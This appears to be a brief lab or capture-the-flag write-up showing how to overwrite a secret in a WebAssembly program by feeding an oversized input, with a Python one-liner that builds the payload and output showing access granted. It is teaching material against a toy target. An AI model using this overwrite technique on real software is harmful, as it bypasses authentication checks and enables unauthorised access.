## Overwriting data
1. Create the payload

```
python3 -c 'open("payload.bin", "wb").write(b"hacked!00000" + b"\x00" + b"hacked!00000")'
```

2. Use the payload as the input
```
$ wasmtime run main.wasm < payload.bin

Enter the secret: 
Secret: hacked!00000
Input: hacked!00000
Access Granted to the cool kids area!
```